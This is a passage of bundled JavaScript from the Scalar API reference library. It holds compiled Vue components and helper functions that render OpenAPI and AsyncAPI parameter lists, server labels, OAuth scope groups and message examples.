		* (e.g. the status code) onto the breadcrumb here to keep property anchors unique.
		*/
		const schemaBreadcrumb = computed(() => __props.collapsableItems && !isStaticTreeItem.value && __props.breadcrumb && __props.name ? [...__props.breadcrumb, __props.name] : __props.breadcrumb);
		/**
		* The breadcrumb for this item's response headers, qualified by status code:
		* `OperationResponses` hands every status the same `[...breadcrumb,
		* 'responses']`, so keying headers off that alone makes all responses share
		* one expansion node (opening 200's headers opens 404's too).
		*/
		const headersBreadcrumb = computed(() => __props.breadcrumb && __props.name ? [...__props.breadcrumb, __props.name] : __props.breadcrumb);
		/**
		* Whether a deep link points at a property inside this collapsed item. When it
		* does, the disclosure opens on mount so a fresh navigation can render the target
		* and scroll it into view (mirrors how collapsible schema disclosures behave).
		*/
		const isOnTargetPath = computed(() => isOnScrollTargetPath(schemaBreadcrumb.value?.join(".")));
		/**
		* The anchor id for a collapsible item's own row. The schema renders without
		* a name (to avoid a duplicate heading), and the name is what makes
		* `SchemaProperty` mount the `WithBreadcrumb` anchor — so the trigger carries
		* the id deep links point at. The copy-link button cannot move here with it:
		* a button may not contain another button.
		*/
		const triggerAnchorId = computed(() => __props.collapsableItems && !isStaticTreeItem.value ? schemaBreadcrumb.value?.join(".") : void 0);
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("li", {
				id: isCompactParameter.value ? triggerAnchorId.value : void 0,
				class: normalizeClass(["parameter-item group/parameter-item parameter-item--tree border-t-0!", { "scroll-mt-24": isCompactParameter.value }])
			}, [createVNode(unref(N$2), { defaultOpen: isOnTargetPath.value }, {
				default: withCtx(({ open, close }) => [
					__props.collapsableItems && !isStaticTreeItem.value ? (openBlock(), createBlock(resolveDynamicComponent(shouldCollapse.value ? unref(Q) : "div"), {
						key: 0,
						id: isCompactParameter.value ? void 0 : triggerAnchorId.value,
						class: normalizeClass(["parameter-item-trigger group/trigger group/tree-control scroll-mt-24 focus-visible:rounded-(--scalar-radius) focus-visible:outline-(length:--scalar-border-width) focus-visible:outline-offset-2 focus-visible:outline-(--scalar-color-accent)", { "parameter-item-trigger-open": open }])
					}, {
						default: withCtx(() => [
							createBaseVNode("div", _hoisted_2$28, [shouldCollapse.value ? (openBlock(), createBlock(SchemaGlyphPuck_default, {
								key: 0,
								anchor: "line",
								class: "parameter-item-glyph",
								open
							}, null, 8, ["open"])) : createCommentVNode("", true), createBaseVNode("div", null, [createVNode(unref(ScalarWrappingText_default), {
								preset: "property",
								text: __props.name
							}, null, 8, ["text"])])]),
							isCompactParameter.value ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createBaseVNode("span", _hoisted_3$20, toDisplayString(unref(getSchemaType)(value.value)), 1), "required" in __props.parameter && __props.parameter.required ? (openBlock(), createElementBlock("div", _hoisted_4$12, toDisplayString(unref(translate)("schema.required")), 1)) : createCommentVNode("", true)], 64)) : createCommentVNode("", true),
							!open && __props.parameter.description ? (openBlock(), createBlock(unref(ScalarMarkdownSummary_default), {
								key: 1,
								truncated: truncated.value,
								"onUpdate:truncated": _cache[0] || (_cache[0] = ($event) => truncated.value = $event),
								class: "parameter-item-description-summary min-w-0 flex-1",
								controlled: "",
								value: __props.parameter.description
							}, null, 8, ["truncated", "value"])) : (openBlock(), createElementBlock("div", _hoisted_5$9))
						]),
						_: 2
					}, 1032, ["id", "class"])) : createCommentVNode("", true),
					(openBlock(), createBlock(resolveDynamicComponent(isRailedPanel.value ? SchemaRailPanel_default : unref(V)), mergeProps(isRailedPanel.value ? {
						as: unref(V),
						depth: 1,
						closeOnRail: true,
						onClose: close
					} : {}, {
						class: ["parameter-item-container parameter-item-container-markdown", {
							"parameter-item-container--tree mt-1.5 mb-0.5 ps-[var(--schema-gutter,16px)]!": isRailedPanel.value,
							"parameter-item-container--static-tree": isStaticTreeItem.value
						}],
						static: !__props.collapsableItems || isStaticTreeItem.value
					}), {
						default: withCtx(() => [
							__props.collapsableItems && !isStaticTreeItem.value && __props.parameter.description ? (openBlock(), createBlock(unref(ScalarMarkdown_default), {
								key: 0,
								class: normalizeClass(["parameter-item-description", { "mt-0!": isRailedPanel.value }]),
								value: __props.parameter.description
							}, null, 8, ["class", "value"])) : createCommentVNode("", true),
							content.value?.[selectedContentType.value]?.itemSchema && !content.value?.[selectedContentType.value]?.schema ? (openBlock(), createElementBlock("p", _hoisted_6$8, toDisplayString(unref(translate)("common.streamItem")), 1)) : createCommentVNode("", true),
							createVNode(SchemaProperty_default, {
								is: "div",
								breadcrumb: schemaBreadcrumb.value,
								compact: "",
								description: __props.collapsableItems && !isStaticTreeItem.value ? "" : __props.parameter.description,
								eventBus: __props.eventBus,
								hideWriteOnly: true,
								modelName: schemaModelName.value,
								name: __props.collapsableItems && !isStaticTreeItem.value ? "" : __props.name,
								noncollapsible: true,
								options: {
									hideWriteOnly: true,
									orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst,
									orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
									expandAllSchemaProperties: __props.options.expandAllSchemaProperties,
									schemaKeyboardNav: __props.options.schemaKeyboardNav,
									hideModels: __props.options.hideModels,
									document: __props.document
								},
								required: "required" in __props.parameter && __props.parameter.required,
								schema: value.value
							}, null, 8, [
								"breadcrumb",
								"description",
								"eventBus",
								"modelName",
								"name",
								"options",
								"required",
								"schema"
							]),
							content.value?.[selectedContentType.value]?.schema && content.value?.[selectedContentType.value]?.itemSchema ? (openBlock(), createBlock(SchemaProperty_default, {
								key: 2,
								is: "div",
								compact: "",
								eventBus: __props.eventBus,
								name: unref(translate)("common.streamItem"),
								noncollapsible: true,
								options: {
									...__props.options,
									hideWriteOnly: true,
									document: __props.document
								},
								schema: unref(getResolvedRef)(content.value[selectedContentType.value]?.itemSchema)
							}, null, 8, [
								"eventBus",
								"name",
								"options",
								"schema"
							])) : createCommentVNode("", true),
							headers.value ? (openBlock(), createBlock(Headers_default, {
								key: 3,
								breadcrumb: headersBreadcrumb.value,
								document: __props.document,
								eventBus: __props.eventBus,
								expandAllSchemaProperties: __props.options.expandAllSchemaProperties,
								headers: headers.value,
								hideModels: __props.options.hideModels,
								orderRequiredPropertiesFirst: __props.options.orderRequiredPropertiesFirst,
								orderSchemaPropertiesBy: __props.options.orderSchemaPropertiesBy,
								schemaKeyboardNav: __props.options.schemaKeyboardNav
							}, null, 8, [
								"breadcrumb",
								"document",
								"eventBus",
								"expandAllSchemaProperties",
								"headers",
								"hideModels",
								"orderRequiredPropertiesFirst",
								"orderSchemaPropertiesBy",
								"schemaKeyboardNav"
							])) : createCommentVNode("", true)
						]),
						_: 1
					}, 16, ["class", "static"])),
					shouldCollapse.value && content.value ? (openBlock(), createElementBlock("div", {
						key: 1,
						class: normalizeClass(["absolute top-[calc(10px+0.5lh)] right-0 z-0 flex -translate-y-1/2 items-center text-base", { "opacity-0 group-focus-within/parameter-item:opacity-100 group-hover/parameter-item:opacity-100": !open }])
					}, [_cache[2] || (_cache[2] = createBaseVNode("div", { class: "from-b-1 absolute inset-y-0 -left-6 -z-1 w-8 bg-linear-to-l from-40% to-transparent" }, null, -1)), createVNode(ContentTypeSelect_default, {
						modelValue: selectedContentType.value,
						"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => selectedContentType.value = $event),
						content: content.value
					}, null, 8, ["modelValue", "content"])], 2)) : createCommentVNode("", true)
				]),
				_: 1
			}, 8, ["defaultOpen"])], 10, _hoisted_1$44);
		};
	}
}), [["__scopeId", "data-v-4c9ec67d"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ParameterList.vue.script.js
var _hoisted_1$43 = {
	key: 0,
	class: "mt-6"
};
var _hoisted_2$27 = ["aria-labelledby"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ParameterList.vue.js
var ParameterList_default = /* @__PURE__ */ defineComponent({
	__name: "ParameterList",
	props: {
		parameters: {},
		breadcrumb: {},
		eventBus: {},
		collapsableItems: { type: Boolean },
		document: {},
		options: {}
	},
	setup(__props) {
		/** Accessible id for the heading */
		const id = useId();
		const { level: headingLevel } = useDocumentOutline("operationSection");
		return (_ctx, _cache) => {
			return __props.parameters?.length ? (openBlock(), createElementBlock("div", _hoisted_1$43, [createVNode(unref(SectionHeaderTag_default), {
				id: unref(id),
				class: "text-c-1 parameter-list-title--tree mt-3 mb-1.5 block! text-lg leading-[1.45] font-medium",
				level: unref(headingLevel),
				rule: ""
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "title")]),
				_: 3
			}, 8, ["id", "level"]), createBaseVNode("ul", {
				"aria-labelledby": unref(id),
				class: "mb-3 list-none p-0 text-sm",
				role: "list"
			}, [(openBlock(true), createElementBlock(Fragment, null, renderList(__props.parameters, (item) => {
				return openBlock(), createBlock(ParameterListItem_default, {
					key: item.name,
					breadcrumb: __props.breadcrumb,
					collapsableItems: __props.collapsableItems,
					document: __props.document,
					eventBus: __props.eventBus,
					name: item.name,
					options: __props.options,
					parameter: item
				}, null, 8, [
					"breadcrumb",
					"collapsableItems",
					"document",
					"eventBus",
					"name",
					"options",
					"parameter"
				]);
			}), 128))], 8, _hoisted_2$27)])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/AsyncApiLabels.vue.script.js
var _hoisted_1$42 = {
	key: 0,
	class: "async-api-labels"
};
var _hoisted_2$26 = { class: "sr-only" };
var _hoisted_3$19 = { class: "sr-only" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/AsyncApiLabels.vue.js
var AsyncApiLabels_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "AsyncApiLabels",
	props: {
		servers: { default: () => [] },
		protocols: { default: () => [] }
	},
	setup(__props) {
		const { translate } = useLocalization();
		/** Hide the whole row when there is nothing to show. */
		const hasLabels = computed(() => __props.servers.length > 0 || __props.protocols.length > 0);
		return (_ctx, _cache) => {
			return hasLabels.value ? (openBlock(), createElementBlock("div", _hoisted_1$42, [__props.servers.length ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createBaseVNode("span", _hoisted_2$26, toDisplayString(unref(translate)("asyncapi.servers")) + ":", 1), (openBlock(true), createElementBlock(Fragment, null, renderList(__props.servers, (server) => {
				return openBlock(), createBlock(unref(Badge_default), {
					key: `server-${server}`,
					class: "async-api-label--server",
					title: server
				}, {
					default: withCtx(() => [createTextVNode(toDisplayString(server), 1)]),
					_: 2
				}, 1032, ["title"]);
			}), 128))], 64)) : createCommentVNode("", true), __props.protocols.length ? (openBlock(), createElementBlock(Fragment, { key: 1 }, [createBaseVNode("span", _hoisted_3$19, toDisplayString(unref(translate)("asyncapi.protocols")) + ":", 1), (openBlock(true), createElementBlock(Fragment, null, renderList(__props.protocols, (protocol) => {
				return openBlock(), createBlock(unref(Badge_default), {
					key: `protocol-${protocol}`,
					class: "async-api-label--protocol",
					title: protocol
				}, {
					default: withCtx(() => [createTextVNode(toDisplayString(protocol), 1)]),
					_: 2
				}, 1032, ["title"]);
			}), 128))], 64)) : createCommentVNode("", true)])) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-6f21951e"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/adapt-async-api-parameters.js
/**
* Adapt AsyncAPI channel parameters into the OpenAPI `ParameterObject` shape so we can reuse the
* existing `ParameterList` rendering instead of building a separate component.
*
* AsyncAPI parameters are address placeholders (the `{param}` expressions in a channel address).
* They are string-only and, because every placeholder in the address must be supplied, always
* required. We therefore map them to `path` parameters (the closest OpenAPI analog) and fold the
* `enum`, `default`, and `examples` fields onto a synthetic string schema so the schema renderer
* can display them. The `location` runtime expression has no display equivalent and is dropped.
*/
var adaptAsyncApiParameters = (parameters) => {
	if (!parameters) return [];
	return Object.entries(parameters).map(([name, value]) => {
		const parameter = getResolvedRef(value) ?? {};
		const schema = { type: "string" };
		if (parameter.enum) schema.enum = parameter.enum;
		if (parameter.default !== void 0) schema.default = parameter.default;
		if (parameter.examples) schema.examples = parameter.examples;
		const result = {
			name,
			in: "path",
			required: true,
			schema
		};
		if (parameter.description) result.description = parameter.description;
		return result;
	});
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/async-api-render-options.js
/**
* Fill in defaults so the shared renderers always receive a complete options object,
* regardless of which fields the caller provided.
*/
var resolveSchemaRenderOptions = (options) => ({
	orderRequiredPropertiesFirst: options?.orderRequiredPropertiesFirst ?? false,
	orderSchemaPropertiesBy: options?.orderSchemaPropertiesBy ?? "preserve",
	expandAllSchemaProperties: options?.expandAllSchemaProperties ?? false,
	schemaKeyboardNav: options?.schemaKeyboardNav ?? false
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/filter-children-by-type.js
/**
* Narrow a navigation entry's children down to a single AsyncAPI node type.
*
* The channel renderer needs its operations and the operation renderer needs its messages; both
* share this type-guarded filter so the cast lives in one place.
*/
var filterChildrenByType = (children, type) => (children ?? []).filter((child) => child.type === type);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/get-async-api-labels.js
/**
* Server names and protocols a channel is available on.
*
* Resolved from `document.servers`, restricted to `channel.servers` when the channel declares them.
* `webSocketOnly` is disabled so labels cover every protocol, not just WebSocket, and protocols are
* de-duplicated while preserving declaration order.
*/
var getChannelServerLabels = (document, channel) => {
	const entries = getAsyncApiServers(document, {
		channel: channel ?? null,
		webSocketOnly: false
	});
	return {
		servers: entries.map((entry) => entry.name),
		protocols: [...new Set(entries.map((entry) => entry.protocol).filter(Boolean))]
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/pick-heading.js
/**
* Pick the first non-empty heading from a list of candidates.
*
* Each candidate is trimmed and the first one with content wins, so the AsyncAPI channel, operation,
* and message renderers can share a single "prefer the human-friendly title, then fall back to a
* key" chain instead of repeating the same `title?.trim() || fallback` logic. Returns an empty
* string when every candidate is missing or blank.
*/
var pickHeading = (...candidates) => {
	for (const candidate of candidates) {
		const trimmed = candidate?.trim();
		if (trimmed) return trimmed;
	}
	return "";
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/resolve-message-traits.js
var schemaMaps = /* @__PURE__ */ new Set([
	"properties",
	"patternProperties",
	"$defs",
	"definitions",
	"dependentSchemas"
]);
var dataFields = /* @__PURE__ */ new Set([
	"example",
	"examples",
	"default",
	"enum",
	"const",
	"value",
	"dataValue"
]);
/**
* Apply JSON Merge Patch to resolved trait fields. Unlike mergeObjects, null removes a key.
* Resolve schema references before merging so a message can extend referenced trait headers.
*/
var mergeTraitFields = (target, patch, context = "object", ancestors = /* @__PURE__ */ new WeakMap()) => {
	const resolvedPatch = context === "object" && isObject(patch) && typeof patch.$ref === "string" ? getResolvedRef(patch) : patch;
	if (!isObject(resolvedPatch)) return resolvedPatch;
	if (ancestors.has(resolvedPatch)) return ancestors.get(resolvedPatch);
	const resolvedTarget = context === "object" && isObject(target) && typeof target.$ref === "string" ? getResolvedRef(target) : target;
	const result = isObject(resolvedTarget) ? { ...resolvedTarget } : {};
	ancestors.set(resolvedPatch, result);
	for (const [key, value] of Object.entries(resolvedPatch)) if (value === null) delete result[key];
	else if (value !== void 0) {
		const childContext = context === "data" ? "data" : context === "map" ? "object" : dataFields.has(key) || key.startsWith("x-") ? "data" : schemaMaps.has(key) ? "map" : "object";
		Object.defineProperty(result, key, {
			value: mergeTraitFields(Object.hasOwn(result, key) ? result[key] : void 0, value, childContext, ancestors),
			enumerable: true,
			configurable: true,
			writable: true
		});
	}
	ancestors.delete(resolvedPatch);
	return result;
};
/** Merge message traits in order, then apply the message's own fields with highest priority. */
var resolveMessageTraits = (message) => {
	if (!message.traits?.length) return message;
	const inherited = message.traits.reduce((fields, trait) => {
		const resolved = getResolvedRef(trait);
		return resolved ? mergeTraitFields(fields, resolved) : fields;
	}, {});
	const merged = mergeTraitFields(inherited, Object.fromEntries(Object.entries(message).filter(([key]) => Object.hasOwn(inherited, key))));
	return {
		...Object.fromEntries(Object.entries(message).filter(([key]) => !Object.hasOwn(inherited, key))),
		...merged
	};
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/resolve-async-api-nodes.js
/**
* Resolve a channel from the document by its `document.channels` key.
*
* Siblings are merged so keys declared alongside a `$ref` are kept rather than dropped, matching
* how the rest of the OpenAPI/AsyncAPI rendering resolves references.
*/
var resolveAsyncApiChannel = (document, channelName) => {
	const node = document.channels?.[channelName];
	return node ? getResolvedRef(node, mergeSiblingReferences) : void 0;
};
/**
* Resolve a message from the channel it lives on. The navigation entry only carries the identifying
* keys, so we walk `document.channels[channelName].messages[messageName]`.
*/
var resolveAsyncApiMessage = (document, channelName, messageName) => {
	const node = resolveAsyncApiChannel(document, channelName)?.messages?.[messageName];
	return node ? resolveMessageTraits(getResolvedRef(node, mergeSiblingReferences)) : void 0;
};
/**
* Resolve an operation from the document by its `document.operations` key.
*
* Operation traits are merged in (matching the channel connection UI) so trait-only fields render
* as part of the operation.
*/
var resolveAsyncApiOperation = (document, operationName) => {
	const node = document.operations?.[operationName];
	return node ? resolveOperationWithTraits(getResolvedRef(node, mergeSiblingReferences)) : void 0;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/helpers/get-required-security.js
/**
* Determine whether an operation requires authentication, using `operation.security ?? document.security`
* as the source of truth. Operation-level `security` fully overrides document-level — including `security: []`,
* which explicitly opts the operation out of auth.
*
* OpenAPI encodes "auth is optional" by including an empty requirement object `{}`. Whenever `{}`
* appears — whether alongside real requirements or as the only entry — auth is treated as optional (state: 'optional').
*/
var getRequiredSecurity = (operation, document) => {
	const securityList = operation?.security ?? document.security ?? [];
	const definedSchemes = document.components?.securitySchemes ?? {};
	let hasEmpty = false;
	const groups = [];
	for (const requirement of securityList) {
		if (!isNonOptionalSecurityRequirement(requirement)) {
			hasEmpty = true;
			continue;
		}
		const schemes = Object.entries(requirement).map(([name, scopes]) => ({
			name,
			scheme: getResolvedRef(definedSchemes[name]),
			scopes: scopes.filter((s) => s.length > 0)
		}));
		if (schemes.length > 0) groups.push({ schemes });
	}
	if (groups.length === 0) return {
		state: hasEmpty ? "optional" : "none",
		requirements: []
	};
	return {
		state: hasEmpty ? "optional" : "required",
		requirements: groups
	};
};
/**
* Scopes that carry OAuth meaning for a scheme. Only `oauth2` and `openIdConnect` schemes
* have real scopes; anything else (for example `http` bearer or `apiKey`) can list
* scope-shaped strings in a `security` requirement, but those are not OAuth scopes and are
* dropped here.
*
* A scheme with no resolved definition (name not defined on the document, or, as the
* AsyncAPI path does on purpose, left unresolved) keeps its scopes — the type is unknown,
* so we cannot rule them out.
*
* This is the single source of truth for "does this scheme contribute scopes?" within this
* module. `getRequiredScopeGroups` relies on it so scope collection never disagrees about
* what counts as a scope.
*/
var getEffectiveScopes = (scheme) => {
	if (scheme.scheme && scheme.scheme.type !== "oauth2" && scheme.scheme.type !== "openIdConnect") return [];
	return scheme.scopes;
};
/**
* Required OAuth scopes grouped by security alternative (OR).
*
* Each returned array is the de-duplicated set of scopes for one alternative, kept in
* declaration order. Scopes are only collected for OAuth2 / OpenID Connect schemes, so
* alternatives without any scopes (for example API-key-only auth) are omitted and the
* result is empty when the operation requires no OAuth scopes.
*
* Grouping is preserved intentionally: unioning scopes across alternatives would imply
* that mutually exclusive scope sets are all required at once, which misstates OpenAPI
* OR semantics.
*/
var getRequiredScopeGroups = (requiredSecurity) => {
	const groups = [];
	for (const group of requiredSecurity.requirements) {
		const collected = /* @__PURE__ */ new Set();
		for (const scheme of group.schemes) for (const scope of getEffectiveScopes(scheme)) collected.add(scope);
		if (collected.size > 0) groups.push([...collected]);
	}
	return groups;
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/OperationScopes.vue.script.js
var _hoisted_1$41 = {
	key: 0,
	class: "mt-6"
};
var _hoisted_2$25 = { class: "text-c-1 mt-3 mb-3 text-lg leading-[1.45] font-medium" };
var _hoisted_3$18 = {
	key: 0,
	class: "text-c-2 mb-2 text-sm"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/OperationScopes.vue.js
var OperationScopes_default = /* @__PURE__ */ defineComponent({
	__name: "OperationScopes",
	props: { requiredSecurity: {} },
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* Required OAuth scopes grouped by security alternative (OR). A single group is the
		* common case and renders as a plain list. Multiple groups are kept separate so that
		* mutually exclusive scope sets are not implied to be required all at once.
		*/
		const scopeGroups = computed(() => getRequiredScopeGroups(__props.requiredSecurity));
		/**
		* Show the "one of" hint only when more than one scope group is rendered. Each group
		* becomes its own list, so multiple groups are genuinely alternative sets a reader can
		* choose between. A single group is just listed plainly, even next to a scope-free
		* alternative (for example an API key), since there is nothing to choose between within
		* one already-mandatory set of scopes.
		*/
		const showAlternativesHint = computed(() => scopeGroups.value.length > 1);
		return (_ctx, _cache) => {
			return scopeGroups.value.length ? (openBlock(), createElementBlock("div", _hoisted_1$41, [
				createBaseVNode("div", _hoisted_2$25, toDisplayString(unref(translate)("authentication.scopes")), 1),
				showAlternativesHint.value ? (openBlock(), createElementBlock("div", _hoisted_3$18, toDisplayString(unref(translate)("authentication.oneOf")), 1)) : createCommentVNode("", true),
				(openBlock(true), createElementBlock(Fragment, null, renderList(scopeGroups.value, (group, index) => {
					return openBlock(), createElementBlock("ul", {
						key: index,
						class: normalizeClass(["mb-3 list-none p-0 text-sm", { "mt-3 border-t pt-3": scopeGroups.value.length > 1 && index > 0 }])
					}, [(openBlock(true), createElementBlock(Fragment, null, renderList(group, (scope) => {
						return openBlock(), createElementBlock("li", {
							key: scope,
							class: "font-code text-c-2"
						}, toDisplayString(scope), 1);
					}), 128))], 2);
				}), 128))
			])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/get-async-api-required-security.js
/**
* Build the required-security model for an AsyncAPI operation so the shared
* `OperationScopes` section can render its OAuth / OpenID Connect scopes.
*
* AsyncAPI declares security on the operation (and its traits) as a list of scheme
* references carrying scopes. `getAsyncApiSecurityRequirements` normalises that into the
* same OR-alternative shape the OpenAPI path uses, so we hand it to `getRequiredSecurity`
* and reuse the exact grouping and de-duplication logic.
*
* Only the scopes are needed for this section, so the scheme objects are left unresolved
* (an empty component set). Server-level security is intentionally excluded: it belongs to
* the channel connection, not a single operation.
*/
var getAsyncApiRequiredSecurity = (document, operation) => getRequiredSecurity({ security: getAsyncApiSecurityRequirements(document, operation, null) }, { components: void 0 });
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/get-generated-payload-example.js
/**
* Snapshot each schema object once, retaining shared and recursive references.
* Unpacking is shallow: use the raw object only for identity and ownership, then
* read through the proxy so reactive edits remain tracked and references resolve.
* Synthetic reference targets stay accessible to the generator but are omitted
* when literal example data is serialized.
*/
var snapshotSchema = (source, seen = /* @__PURE__ */ new WeakMap()) => {
	if (typeof source !== "object" || source === null) return source;
	const raw = unpackProxyObject(source);
	const existing = seen.get(raw);
	if (existing) return existing;
	const snapshot = Array.isArray(source) ? [] : {};
	seen.set(raw, snapshot);
	for (const key of Object.keys(source)) Object.defineProperty(snapshot, key, {
		value: snapshotSchema(Reflect.get(source, key), seen),
		enumerable: key !== "$ref-value" || Object.hasOwn(raw, key),
		configurable: true,
		writable: true
	});
	return snapshot;
};
/** Generate a payload only when the document does not already provide one. */
var getGeneratedPayloadExample = (message) => {
	if (message.examples?.some((example) => getResolvedRef(example)?.payload !== void 0)) return;
	const payload = getResolvedRef(message.payload);
	if (isObject(payload) && "schemaFormat" in payload) {
		const mediaType = String(payload.schemaFormat).split(";")[0]?.trim().toLowerCase();
		if (![
			"application/schema+json",
			"application/schema+yaml",
			"application/vnd.aai.asyncapi+json",
			"application/vnd.aai.asyncapi+yaml"
		].includes(mediaType ?? "")) return;
	}
	const schema = getAsyncApiMessagePayloadSchema(message);
	if (!schema) return;
	return getExampleFromSchema(snapshotSchema(schema), {
		emptyString: "string",
		includeDeprecated: true
	});
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/helpers/get-message-example-content.js
/** Format the selected message example once so the code block and clipboard show the same content. */
var getMessageExampleContent = (example) => {
	const body = example.payload !== void 0 ? example.payload : example.headers;
	const content = example.headers !== void 0 && example.payload !== void 0 ? {
		headers: example.headers,
		payload: example.payload
	} : body;
	if (content === null || typeof content === "boolean") return String(content);
	if (typeof content === "string" || typeof content === "number" || Array.isArray(content) || isObject(content)) return prettyPrintJson(content);
};
//#endregion
//#region node_modules/@scalar/components/dist/components/ScalarVirtualCodeBlock/ScalarVirtualCodeBlock.vue.js
var ScalarVirtualCodeBlock_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ScalarVirtualCodeBlock",
	props: {
		content: {},
		lang: { default: "plaintext" },
		copy: {
			type: [String, Boolean],
			default: "hover"
		},
		lineHeight: { default: 20 }
	},
	setup(__props) {
		const { cx } = useBindCx();
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", normalizeProps$1(guardReactiveProps(unref(cx)("scalar-code-block group/code-block flex flex-col", "relative bg-b-1 min-h-0 min-w-0"))), [createVNode(ScalarVirtualText_default, {
				containerClass: "custom-scroll overflow-auto flex flex-1 max-h-screen",
				contentClass: "language-plaintext whitespace-pre font-code text-base p-2",
				lineHeight: __props.lineHeight,
				text: __props.content
			}, null, 8, ["lineHeight", "text"]), __props.copy ? (openBlock(), createBlock(ScalarCodeBlockCopy_default, {
				key: 0,
				class: normalizeClass(["scalar-code-copy absolute top-2.5 right-2.5", [{ "opacity-100": __props.copy === "always" }]]),
				content: __props.content,
				showLang: true,
				lang: __props.lang
			}, {
				backdrop: withCtx(() => [createVNode(ScalarCopyBackdrop_default, { class: "scalar-code-copy-backdrop -right-1.5 -top-1" })]),
				_: 1
			}, 8, [
				"class",
				"content",
				"lang"
			])) : createCommentVNode("", true)], 16);
		};
	}
});
//#endregion
//#region node_modules/@scalar/helpers/dist/string/iterate-title.js
/**
* Check for duplicate titles, and iterate title
*/
var iterateTitle = (title, checkDuplicates, separator = " #") => {
	if (!checkDuplicates(title)) return title;
	const split = title.split(separator);
	return iterateTitle(split.length > 1 ? `${split.slice(0, -1).join()}${separator}${Number(split.at(-1)) + 1}` : `${split.join()}${separator}2`, checkDuplicates, separator);
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/MessageExamples.vue.script.js
var _hoisted_1$40 = { key: 1 };
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/AsyncApi/MessageExamples.vue.js
var MessageExamples_default = /* @__PURE__ */ defineComponent({
	__name: "MessageExamples",
	props: {
		examples: { default: () => [] },
		generatedPayload: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/** Array positions keep duplicate names and generated labels from overwriting another example. */
		const availableExamples = computed(() => {
			const entries = (__props.generatedPayload === void 0 ? __props.examples : [...__props.examples, {
				name: "Generated example",
				payload: __props.generatedPayload
			}]).flatMap((value, index) => {
				const example = getResolvedRef(value);
				if (!example || example.headers === void 0 && example.payload === void 0) return [];
				return [{
					key: String(index),
					example,
					label: example.name || `${translate("schema.example")} ${index + 1}`
				}];
			});
			const labels = new Set(entries.flatMap(({ example }) => example.name ? [example.name] : []));
			return entries.map((entry) => {
				const label = entry.example.name || iterateTitle(entry.label, (value) => labels.has(value));
				labels.add(label);
				return {
					...entry,
					label
				};
			});
		});
		const selectedKey = ref("");
		watch(availableExamples, (values) => {
			if (!values.some(({ key }) => key === selectedKey.value)) selectedKey.value = values[0]?.key ?? "";
		}, { immediate: true });
		const selected = computed(() => availableExamples.value.find(({ key }) => key === selectedKey.value));
		const content = computed(() => selected.value ? getMessageExampleContent(selected.value.example) : void 0);
		const pickerExamples = computed(() => Object.fromEntries(availableExamples.value.map(({ key, label }) => [key, { summary: label }])));
		const hasMultipleExamples = computed(() => availableExamples.value.length > 1);
		const showFooter = computed(() => hasMultipleExamples.value || selected.value?.example.name || selected.value?.example.summary);
		return (_ctx, _cache) => {
			return content.value !== void 0 ? (openBlock(), createBlock(unref(ScalarCard_default), {
				key: 0,
				class: "min-w-0 self-start text-base",
				label: unref(translate)("schema.examples")
			}, {
				default: withCtx(() => [
					createVNode(unref(ScalarCardHeader_default), null, {
						actions: withCtx(() => [createVNode(unref(ScalarCopy_default), {
							"aria-label": unref(translate)("common.copyExample"),
							content: content.value,
							placement: "left"
						}, {
							copy: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("common.copyExample")), 1)]),
							_: 1
						}, 8, ["aria-label", "content"])]),
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.examples")) + " ", 1)]),
						_: 1
					}),
					createVNode(unref(ScalarCardSection_default), null, {
						default: withCtx(() => [content.value.length > 2e4 ? (openBlock(), createBlock(unref(ScalarVirtualCodeBlock_default), {
							key: 0,
							class: "bg-b-2",
							content: content.value,
							lang: "json"
						}, null, 8, ["content"])) : (openBlock(), createBlock(unref(ScalarCodeBlock_default), {
							key: 1,
							class: "bg-b-2",
							lang: "json",
							prettyPrintedContent: content.value
						}, null, 8, ["prettyPrintedContent"]))]),
						_: 1
					}),
					showFooter.value ? (openBlock(), createBlock(unref(ScalarCardFooter_default), {
						key: 0,
						class: "text-c-2 flex flex-wrap items-center gap-2"
					}, {
						default: withCtx(() => [hasMultipleExamples.value ? (openBlock(), createBlock(unref(t$2), {
							key: 0,
							modelValue: selectedKey.value,
							"onUpdate:modelValue": _cache[0] || (_cache[0] = ($event) => selectedKey.value = $event),
